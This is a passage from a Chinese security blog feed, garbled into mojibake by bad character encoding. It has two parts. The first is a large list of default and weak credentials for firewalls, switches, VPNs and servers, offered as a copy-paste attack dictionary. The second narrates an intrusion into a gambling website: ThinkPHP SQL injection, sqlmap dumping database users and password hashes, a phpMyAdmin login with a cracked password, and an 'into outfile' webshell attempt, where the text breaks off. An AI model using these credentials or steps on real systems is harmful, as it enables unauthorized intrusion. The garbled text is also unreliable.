ï¼Œè¿™ä¸ªåªèƒ½é è¿æ°”</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/690458723.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4131629986.png"></p><h3 id="vmwarw-harbor"><a href="#vmwarw-harbor" class="headerlink" title="vmwarw harbor"></a>vmwarw harbor</h3><p>Harboræ˜¯ä¸€ä¸ªç”¨äºå­˜å‚¨å’Œåˆ†å‘Dockeré•œåƒçš„ä¼ä¸šçº§RegistryæœåŠ¡å™¨ï¼Œé€šè¿‡æ·»åŠ ä¸€äº›ä¼ä¸šå¿…éœ€çš„åŠŸèƒ½ç‰¹æ€§ï¼Œä¾‹å¦‚å®‰å…¨ã€æ ‡è¯†å’Œç®¡ç†ç­‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1331409580.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è´¦å·admin å¯†ç Harbor12345</span><br></pre></td></tr></table></figure><h3 id="æ·±ä¿¡æœè®¾å¤‡"><a href="#æ·±ä¿¡æœè®¾å¤‡" class="headerlink" title="æ·±ä¿¡æœè®¾å¤‡"></a>æ·±ä¿¡æœè®¾å¤‡</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3547885437.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3954805141.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·åï¼šsangfor</span><br><span class="line">å¯†ç ï¼š sangfor</span><br><span class="line">      sangfor@2018</span><br><span class="line">      sangfor@2019</span><br><span class="line">      admin&#x2F;admin</span><br><span class="line">      admin&#x2F;ç©º</span><br></pre></td></tr></table></figure><h3 id="åä¸ºè®¾å¤‡"><a href="#åä¸ºè®¾å¤‡" class="headerlink" title="åä¸ºè®¾å¤‡"></a>åä¸ºè®¾å¤‡</h3><h4 id="åä¸ºäº¤æ¢æœº"><a href="#åä¸ºäº¤æ¢æœº" class="headerlink" title="åä¸ºäº¤æ¢æœº"></a>åä¸ºäº¤æ¢æœº</h4><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/399654145.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·åï¼šadmin</span><br><span class="line">å¯†ç ï¼šadmin@huawei</span><br><span class="line">å¯†ç ï¼šadmin@huawei.com</span><br></pre></td></tr></table></figure><h4 id="åä¸ºUSG2250"><a href="#åä¸ºUSG2250" class="headerlink" title="åä¸ºUSG2250"></a>åä¸ºUSG2250</h4><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4850303.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x2F;Admin@123</span><br></pre></td></tr></table></figure><h3 id="zentao"><a href="#zentao" class="headerlink" title="zentao"></a>zentao</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/300904352.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zentao ç”¨æˆ·åï¼šadmin   å¯†ç ï¼š123456</span><br></pre></td></tr></table></figure><h3 id="Apache-ActiveMQ"><a href="#Apache-ActiveMQ" class="headerlink" title="Apache ActiveMQ"></a>Apache ActiveMQ</h3><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/137499804.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æœªæˆæƒ&#x2F;admin&#x2F;connections.jsp</span><br><span class="line">ç”¨æˆ·åï¼šadmin  å¯†ç ï¼šadmin</span><br></pre></td></tr></table></figure><h3 id="zabbix"><a href="#zabbix" class="headerlink" title="zabbix"></a>zabbix</h3><p>æŸsrcçœŸå®é‡åˆ°è¿‡ï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäºWEBç•Œé¢çš„æä¾›åˆ†å¸ƒå¼ç³»ç»Ÿç›‘è§†ä»¥åŠç½‘ç»œç›‘è§†åŠŸèƒ½çš„ä¼ä¸šçº§çš„å¼€æºè§£å†³æ–¹æ¡ˆ<br>æ›´å¯åå¼¹shellæ‹¿ä¸‹æƒé™å“¦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1290740421.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·åï¼šadmin   å¯†ç ï¼šzabbix</span><br></pre></td></tr></table></figure><h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><p>RabbitMQæ˜¯å®ç°äº†é«˜çº§æ¶ˆæ¯é˜Ÿåˆ—åè®®ï¼ˆAMQPï¼‰çš„å¼€æºæ¶ˆæ¯ä»£ç†è½¯ä»¶ï¼ˆäº¦ç§°é¢å‘æ¶ˆæ¯çš„ä¸­é—´ä»¶ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/537590096.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é»˜è®¤è´¦å·å¯†ç guest&#x2F;guest  admin&#x2F;admin</span><br></pre></td></tr></table></figure><h2 id="å†å¥‰ä¸Šå¸¸è§çš„å¼±å£ä»¤æŸ¥è¯¢ç½‘ç«™ï¼ˆæ€ä¹ˆå«å¼±å£ä»¤å‹’ï¼Ÿï¼Œåº”è¯¥å«é»˜è®¤å¯†ç å’Œè´¦å·ï¼‰ï¼š"><a href="#å†å¥‰ä¸Šå¸¸è§çš„å¼±å£ä»¤æŸ¥è¯¢ç½‘ç«™ï¼ˆæ€ä¹ˆå«å¼±å£ä»¤å‹’ï¼Ÿï¼Œåº”è¯¥å«é»˜è®¤å¯†ç å’Œè´¦å·ï¼‰ï¼š" class="headerlink" title="å†å¥‰ä¸Šå¸¸è§çš„å¼±å£ä»¤æŸ¥è¯¢ç½‘ç«™ï¼ˆæ€ä¹ˆå«å¼±å£ä»¤å‹’ï¼Ÿï¼Œåº”è¯¥å«é»˜è®¤å¯†ç å’Œè´¦å·ï¼‰ï¼š"></a>å†å¥‰ä¸Šå¸¸è§çš„å¼±å£ä»¤æŸ¥è¯¢ç½‘ç«™ï¼ˆæ€ä¹ˆå«å¼±å£ä»¤å‹’ï¼Ÿï¼Œåº”è¯¥å«é»˜è®¤å¯†ç å’Œè´¦å·ï¼‰ï¼š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HUAWEI é»˜è®¤è´¦å·&#x2F;å¯†ç æŸ¥è¯¢å·¥å…·ï¼š</span><br><span class="line">https:&#x2F;&#x2F;support.huawei.com&#x2F;onlinetoolweb&#x2F;pqt&#x2F;index.jsp</span><br><span class="line">è·¯ç”±å™¨å¯†ç ç¤¾åŒºæ•°æ®åº“ï¼š</span><br><span class="line">http:&#x2F;&#x2F;www.routerpasswords.com</span><br><span class="line">é»˜è®¤è·¯ç”±å™¨å¯†ç åˆ—è¡¨ï¼š</span><br><span class="line">https:&#x2F;&#x2F;portforward.com&#x2F;router-password&#x2F;</span><br><span class="line"></span><br><span class="line">ç„¶åå°±æ˜¯ç™¾åº¦ï¼Œgoogleäº†ï¼Œå¥½ä¸å¥½ä½¿ï¼Œæ‡‚çš„éƒ½æ‡‚å—·</span><br></pre></td></tr></table></figure><p>å†é™„ä¸Šä¸€æ³¢å­—å…¸ï¼Œå¤§å®¶ç›´æ¥å¤åˆ¶ç²˜è´´ä¿å­˜å§ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">æ·±ä¿¡æœäº§å“  sangfor  sangfor sangfor@2018 sangfor@2019</span><br><span class="line">æ·±ä¿¡æœç§‘æŠ€â€‚AD     dlanrecover</span><br><span class="line">æ·±ä¿¡æœè´Ÿè½½å‡è¡¡ AD 3.6  admin  admin</span><br><span class="line">æ·±ä¿¡æœWAC ( WNS V2.6)  admin  admin</span><br><span class="line">æ·±ä¿¡æœVPN  Admin  Admin</span><br><span class="line">æ·±ä¿¡æœipsec-VPN (SSL 5.5)  Admin  Admin</span><br><span class="line">æ·±ä¿¡æœAC6.0  admin  admin</span><br><span class="line">SANGFORé˜²ç«å¢™  admin  sangfor</span><br><span class="line">æ·±ä¿¡æœAF(NGAF V2.2)  admin  sangfor</span><br><span class="line">æ·±ä¿¡æœNGAFä¸‹ä¸€ä»£åº”ç”¨é˜²ç«å¢™(NGAF V4.3)  admin  admin</span><br><span class="line">æ·±ä¿¡æœAD3.9  admin  admin</span><br><span class="line">æ·±ä¿¡æœä¸Šç½‘è¡Œä¸ºç®¡ç†è®¾å¤‡æ•°æ®ä¸­å¿ƒ  Admin  å¯†ç ä¸ºç©º</span><br><span class="line">SANGFOR_AD_v5.1  admin  admin</span><br><span class="line">ç½‘å¾¡æ¼æ´æ‰«æç³»ç»Ÿ  leadsec  leadsec</span><br><span class="line">å¤©é˜—å…¥ä¾µæ£€æµ‹ä¸ç®¡ç†ç³»ç»Ÿ V7.0  Admin  venus70</span><br><span class="line">   Audit  venus70</span><br><span class="line">   adm  venus70</span><br><span class="line">å¤©é˜—å…¥ä¾µæ£€æµ‹ä¸ç®¡ç†ç³»ç»Ÿ V6.0  Admin  venus60</span><br><span class="line">   Audit  venus60</span><br><span class="line">   adm  venus60</span><br><span class="line">ç½‘å¾¡WAFé›†ä¸­æ§åˆ¶ä¸­å¿ƒ(V3.0R5.0)  admin  leadsec.waf</span><br><span class="line">   audit  leadsec.waf</span><br><span class="line">   adm  leadsec.waf</span><br><span class="line">è”æƒ³ç½‘å¾¡  administrator  administrator</span><br><span class="line">ç½‘å¾¡äº‹ä»¶æœåŠ¡å™¨  admin  admin123</span><br><span class="line">è”æƒ³ç½‘å¾¡é˜²ç«å¢™PowerV  administrator  administrator</span><br><span class="line">è”æƒ³ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ  lenovo  default</span><br><span class="line">ç½‘ç»œå«å£«å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ  admin  talent</span><br><span class="line">ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»ŸV3.2.72.0  adm  leadsec32</span><br><span class="line">   admin  leadsec32</span><br><span class="line">è”æƒ³ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»ŸIDS  root  111111</span><br><span class="line">   admin  admin123</span><br><span class="line">ç§‘æ¥ç½‘ç»œå›æº¯åˆ†æç³»ç»Ÿ  csadmin  colasoft</span><br><span class="line">ä¸­æ§è€ƒå‹¤æœºweb3.0  administrator  123456</span><br><span class="line">H3C iMC  admin  admin</span><br><span class="line">H3C SecPathç³»åˆ—  admin  admin</span><br><span class="line">H3C S5120-SI  test  123</span><br><span class="line">H3Cæ™ºèƒ½ç®¡ç†ä¸­å¿ƒ  admin  admin</span><br><span class="line">H3C ER3100  admin  adminer3100</span><br><span class="line">H3C ER3200  admin  adminer3200</span><br><span class="line">H3C ER3260  admin  adminer3260</span><br><span class="line">H3C  admin  adminer</span><br><span class="line">   admin  admin</span><br><span class="line">   admin  h3capadmin</span><br><span class="line">   h3c  h3c</span><br><span class="line">360å¤©æ“  admin  admin</span><br><span class="line">ç½‘ç¥é˜²ç«å¢™  firewall  firewall</span><br><span class="line">å¤©èä¿¡é˜²ç«å¢™NGFW4000  superman  talent</span><br><span class="line">é»‘ç›¾é˜²ç«å¢™  admin  admin</span><br><span class="line">   rule  abc123</span><br><span class="line">   audit  abc123</span><br><span class="line">åä¸ºé˜²ç«å¢™  telnetuser  telnetpwd</span><br><span class="line">   ftpuser  ftppwd</span><br><span class="line">æ–¹æ­£é˜²ç«å¢™  admin  admin</span><br><span class="line">é£å¡”é˜²ç«å¢™  admin  å¯†ç ä¸ºç©º</span><br><span class="line">Juniper_SSG__5é˜²ç«å¢™  netscreen  netscreen</span><br><span class="line">ä¸­æ–°é‡‘ç›¾ç¡¬ä»¶é˜²ç«å¢™  admin  123</span><br><span class="line">killé˜²ç«å¢™(å† ç¾¤é‡‘è¾°)  admin  sys123</span><br><span class="line">å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™  admin  venus.fw</span><br><span class="line">   Audit  venus.audit</span><br><span class="line">   useradmin  venus.user</span><br><span class="line">é˜¿å§†ç‘ç‰¹é˜²ç«å¢™  admin  manager</span><br><span class="line">å±±çŸ³ç½‘ç§‘  hillstone  hillstone</span><br><span class="line">ç»¿ç›Ÿå®‰å…¨å®¡è®¡ç³»ç»Ÿ  weboper  weboper</span><br><span class="line">   webaudit  webaudit</span><br><span class="line">   conadmin  conadmin</span><br><span class="line">   admin  admin</span><br><span class="line">   shell  shell</span><br><span class="line">ç»¿ç›Ÿäº§å“     nsfocus123</span><br><span class="line">TopAuditæ—¥å¿—å®¡è®¡ç³»ç»Ÿ  superman  talent</span><br><span class="line">LogBaseæ—¥å¿—ç®¡ç†ç»¼åˆå®¡è®¡ç³»ç»Ÿ  admin  safetybase</span><br><span class="line">ç½‘ç¥SecFoxè¿ç»´å®‰å…¨ç®¡ç†ä¸å®¡è®¡ç³»ç»Ÿ  admin  !1fw@2soc#3vpn</span><br><span class="line">å¤©èä¿¡æ•°æ®åº“å®¡è®¡ç³»ç»Ÿ  superman  telent</span><br><span class="line">Hillstoneå®‰å…¨å®¡è®¡å¹³å°  hillstone  hillstone</span><br><span class="line">ç½‘åº·æ—¥å¿—ä¸­å¿ƒ  ns25000  ns25000</span><br><span class="line">ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»Ÿï¼ˆä¸­ç§‘æ–°ä¸šï¼‰  admin  123456</span><br><span class="line">å¤©ç¥ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»Ÿ  Admin  cyberaudit</span><br><span class="line">æ˜å¾¡WEBåº”ç”¨é˜²ç«å¢™  admin  admin</span><br><span class="line">   admin  adminadmin</span><br><span class="line">æ˜å¾¡æ”»é˜²å®éªŒå®¤å¹³å°  root  123456</span><br><span class="line">æ˜å¾¡å®‰å…¨ç½‘å…³  admin  adminadmin</span><br><span class="line">æ˜å¾¡è¿ç»´å®¡è®¡ä¸å†Œé£é™©æ§åˆ¶ç³»ç»Ÿ  admin  1q2w3e</span><br><span class="line">   system  1q2w3e4r</span><br><span class="line">   auditor  1q2w3e4r</span><br><span class="line">   operator  1q2w3e4r</span><br><span class="line">æ˜å¾¡ç½‘ç«™å«å£«  sysmanager  sysmanager888</span><br><span class="line">äº¿é‚®é‚®ä»¶ç½‘å…³  eyouuser  eyou_admin</span><br><span class="line">   eyougw  admin@(eyou)</span><br><span class="line">   admin  +-ccccc</span><br><span class="line">   admin  cyouadmin</span><br><span class="line">Websenseé‚®ä»¶å®‰å…¨ç½‘å…³  administrator  admin</span><br><span class="line">æ¢­å­é±¼é‚®ä»¶å­˜å‚¨ç½‘å…³  admin  admin</span><br></pre></td></tr></table></figure><p>å¼±å£ä»¤å¥½ä¸å¥½ç”¨ï¼Œè°ç”¨è°çŸ¥é“å•Šï¼Œå®åœ¨ä¸è¡Œï¼Œtop1000å¯†ç å­—å…¸è·‘ä¸€æ³¢ï¼Œè·‘ä¸å‡ºæ¥å°±ç®—äº†ï¼ä½ è¿™ç«™ä¸æ—¥ä¹Ÿç½¢ï¼Œå¤§å®¶éƒ½è®²ç©¶ä½›ç³»æ—¥ç«™ï¼Œå‘½é‡Œæœ‰å°±æœ‰ï¼Œæ²¡å°±æ²¡!</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼±å£ä»¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡è èœç«™å¯¹æŠ¤å«ç¥çš„åˆ©ç”¨</title>
      <link href="2020/12/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8F%A0%E8%8F%9C%E7%AB%99%E5%AF%B9%E6%8A%A4%E5%8D%AB%E7%A5%9E%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>2020/12/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%8F%A0%E8%8F%9C%E7%AB%99%E5%AF%B9%E6%8A%A4%E5%8D%AB%E7%A5%9E%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>å› ä¸ºè¿™ä¸ªç«™æ˜¯å‡ ä¸ªæœˆå‰æ—¥çš„äº†ï¼Œæ‰€ä»¥å›¾ç‰‡å¯èƒ½ä¸å…¨ï¼Œä¹Ÿæ²¡åŠæ³•å†è¡¥å›¾ã€‚<br>å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œéš”å£æƒ…ä¾£æ­£åœ¨é¼“æŒï¼Œå£°éŸ³è´¼å“ï¼Œå¯¼è‡´æˆ‘å†™çš„ä¸œè¥¿å¯èƒ½æ²¡æœ‰è¿‡ä¸€éè„‘å­ï¼Œå†™çš„å¯èƒ½æœ‰ç‚¹æ··ä¹±ã€‚å¦å¤–å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸ºå•¥æˆ‘ä»¬åšå®‰å…¨çš„ç»å¸¸éš”å£ç¢°åˆ°è¿™ç§äººï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/531912594.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2914407144.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3369175273.png"></p><p>å·²çŸ¥ç›®æ ‡ç½‘ç«™</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2089622478.png"></p><p>ä¹‹å‰å®¢æˆ·æœ‰ç»™è¿‡è¿™ç§ç½‘ç«™ï¼Œæ‰€ä»¥æˆ‘è®°å¿†å°¤æ·±ï¼Œé’ˆå¯¹è¿™ç§ç«™ä¸€èˆ¬ä½ å¯ä»¥ç›´æ¥æ”¾å¼ƒæ­£å¸¸æµ‹è¯•æµç¨‹äº†ï¼Œå› ä¸ºç»éªŒå‘Šè¯‰æˆ‘ï¼Œç½‘ç«™ä¸»ç«™åŠŸèƒ½åŸºæœ¬ä¸Šå¾ˆå°‘æœ‰æ¼æ´çš„ï¼Œåªèƒ½ä»æ—ç«™ä¸‹æ‰‹ã€‚</p><p>Ctrl+uæŸ¥çœ‹ä¸€æ³¢æ²¡å‘ç°æœ‰ä»€ä¹ˆå­˜åœ¨æ³„æ¼çš„jsï¼Œå›è¿‡å¤´å‘ç°å‘ç°ç½‘ç«™å³ä¸Šè§’æœ‰ä¸ªä¼˜æƒ æ´»åŠ¨å¤§å…</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1558716760.png"></p><p>æ‰“å¼€åé¡µé¢ä¼¼æ›¾ç›¸è¯†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3329498645.png"></p><p>éšä¾¿ç‚¹å¼€ä¸€ä¸ªæ´»åŠ¨ï¼Œå¥½åƒå¯ä»¥éšä¾¿æäº¤æ–‡å­—ï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œæˆ‘ä¿¡å¿ƒæ»¡æ»¡è¾“å…¥xssï¼Œæäº¤ï¼Œç„¶è€Œä¸¤å¤©è¿‡å»äº†ï¼Œå¹¶æ²¡ä»€ä¹ˆå¼ç”¨ï¼Œæˆ‘å½“æ—¶çš„å¿ƒæƒ…çœŸæ˜¯åƒäº‘åƒé›¾åˆåƒé›¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4285896928.png"></p><p>ç„¶è€Œæˆ‘åˆå‘ç°ä¸‹é¢æœ‰ä¸ªå®¡æ ¸è¿›åº¦æŸ¥è¯¢ï¼Œæ‰“å¼€åä¼šè®©ä½ è¾“å…¥ç”¨æˆ·åï¼Œæ—¢ç„¶æœ‰è¾“å…¥ç”¨æˆ·åï¼Œé‚£åº”è¯¥å°±æ˜¯æœ‰å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼Œä¹ æƒ¯æ€§åŠ äº†ä¸ªâ€™ç‚¹å‡»æŸ¥è¯¢ï¼Œ10ç§’è¿‡å»äº†ï¼Œæ²¡å“åº”ï¼Œæˆ‘æ‡µäº†ï¼Œè¾“å…¥æ­£å¸¸ä¸å­˜åœ¨çš„è´¦å·æµ‹è¯•ï¼Œæ˜¯ä¼šå¼¹å‡ºè®°å½•çš„ï¼Œä½†æ˜¯åŠ å•å¼•å·æŸ¥è¯¢å´ä¸€ç‚¹å“åº”éƒ½æ²¡æœ‰ã€‚<br>F12-networkæŠ“åŒ…ï¼Œå‘ç°æ˜¯æœ‰å‘é€è¯·æ±‚çš„ï¼Œå¾ˆæ˜æ˜¾äº†ï¼Œæœ‰æ³¨å…¥ï¼Œè€Œä¸”æŠ¥é”™æ˜¯é¡µé¢æ˜¯thinkphpï¼Œä»æœ€ä¸‹è§’çœ‹ç‰ˆæœ¬æ˜¯3.2.3ï¼Œè¿™ä¸ªç‰ˆæœ¬çœŸçš„æ˜¯hcçš„æœ€çˆ±ï¼Œä»è‰²æƒ…åˆ°è´·æ¬¾å¹³å°ï¼Œå†åˆ°è èœéƒ½æ˜¯è¿™ä¸ªç‰ˆæœ¬çš„thinkphpã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2361887523.png"></p><p>å…ˆæ³¨å…¥ä¸€æ³¢è¯•è¯•</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2325183407.png"></p><p>æŠ“åŒ…Sqlmapä¸€æ³¢æ‹¿åˆ°äº†ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œçªç„¶æˆ‘æ„è¯†åˆ°ï¼Œæˆ‘æ²¡æœ‰åå°åœ°å€ï¼Œæ‹¿åˆ°äº†ä¹Ÿæ²¡å¼ç”¨ã€‚<br>Fofaä¸€æ³¢å¾—åˆ°çœŸå®ipï¼Œå‘ç°999ç«¯å£å­˜åœ¨phpmyadminæœåŠ¡ï¼Œ6588æœ‰ä¸€ä¸ªæ ‡é¢˜ä¸ºæŠ¤å«ç¥ä¸¶ä¸»æœºå¤§å¸ˆçš„aspç«™ã€‚ç›®å½•çˆ†ç ´ï¼Œç«¯å£æ‰«æï¼Œå­åŸŸåæŒ–æ˜ï¼Œéƒ½æ²¡æœ‰æ‰¾åˆ°åå°åœ°å€ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3106152376.png"></p><p>Os-shellæˆåŠŸï¼Œä½†æ˜¯ä¸ç®¡æˆ‘è¾“å…¥ä»€ä¹ˆéƒ½æ²¡ååº”ã€‚<br>Sql-shellä¹Ÿä¸€æ ·ï¼Œä»”ç»†è§‚å¯Ÿå‘ç°ï¼Œç½‘ç«™è·¯å¾„æ˜¯è£…åœ¨æŠ¤å«ç¥çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3277388445.png"></p><p>æœ‰å¯èƒ½æ˜¯æŠ¤å«ç¥æ‹¦æˆªäº†ï¼Œå½“æ—¶æˆ‘è¿˜ç–‘æƒ‘ï¼Œè¿™phpçš„ç«™ï¼Œä½ ç”¨æŠ¤å«ç¥æ˜¯ä»€ä¹ˆæ„æ€ã€‚</p><p>ç­‰åˆ°ååˆ†é’Ÿåç™¾åº¦äº†ä¸€ä¸‹hwshostmasterï¼Œæˆ‘æ‰çŸ¥é“æˆ‘æ˜¯å¤šä¹ˆæ— çŸ¥ï¼ŒåŸæ¥æŠ¤å«ç¥ä¸æ˜¯å…‰æœ‰wafï¼Œä»–è¿˜æœ‰ä¸€ä¸ªå«ä¸»æœºå¤§å¸ˆçš„æœåŠ¡ï¼Œå¤§æ¦‚åŠŸèƒ½ä¸phpstudyç›¸åŒã€‚</p><p>æœ¬åœ°å®‰è£…è§‚å¯Ÿï¼Œå‘ç°ä¸»æœºå¤§å¸ˆé»˜è®¤å®‰è£…åä¼šåœ¨999ç«¯å£å¯åŠ¨phpmyadminï¼Œ6588ç«¯å£åˆ™å¯åŠ¨ä¸»æœºå¤§å¸ˆé»˜è®¤çš„ç®¡ç†é¡µé¢ï¼Œä¸æˆ‘è§‚å¯Ÿçš„ç›®æ ‡ipç«¯å£ä¸€è‡´ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/8790396.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1046154199.png"></p><p>æ—¢ç„¶ç›®æ ‡ç«™æœ‰phpmyadminï¼Œé‚£æˆ‘å°±å¯ä»¥å°è¯•ä½¿ç”¨sqlmapæšä¸¾ä¸€ä¸‹å¯¹æ–¹æ•°æ®åº“è´¦å·ä¸å¯†ç hashã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap â€“r sql.txt --string&#x3D;&quot;Surname&quot; --users --password</span><br></pre></td></tr></table></figure><p>Sqlmapæšä¸¾å‡ºæ¥äº†rootä¸testï¼Œrootçš„å¯†ç æ²¡æœ‰ç ´è§£å‡ºæ¥ï¼Œä½†æ˜¯testçš„å¯†ç ç ´è§£å‡ºæ¥ä¸º1234ã€‚ç™»é™†æˆåŠŸã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/24135875.png"></p><p>å…³äºè¿™ç§æƒ…å†µæ‹¿shellï¼Œæœ¨ç¥çš„é»‘ç™½å¤©å…¬ä¼—å·é‡Œæœ‰ç¯‡æ–‡ç« &lt;phpMyAdmin æ¸—é€åˆ©ç”¨æ€»ç»“&gt;å·²ç»å†™çš„å¾ˆè¯¦ç»†äº†ï¼Œæœ¨ç¥çœ‹åˆ°è¿™ç¯‡æ–‡ç« éº»çƒ¦æ‰¾æˆ‘ç»“ä¸€ä¸‹å¹¿å‘Šè´¹ã€‚</p><p>mysqlæ•°æ®åº“getshellä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œinto outfileï¼Œå¯¼å‡ºæ—¥å¿—ã€‚<br>æ ¹æ®æ³¨å…¥æŠ¥é”™é¡µé¢çš„æ–‡ä»¶åœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2477573225.png"></p><p>æ„é€ è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 into outfile &#39;D:&#x2F;wwwroot&#x2F;xxx.com&#x2F;web&#x2F;1.txt&#39;</span><br></pre></td></tr></table></figure><p>æŠ¥é”™<code>#1 - Can&#39;t create/write to 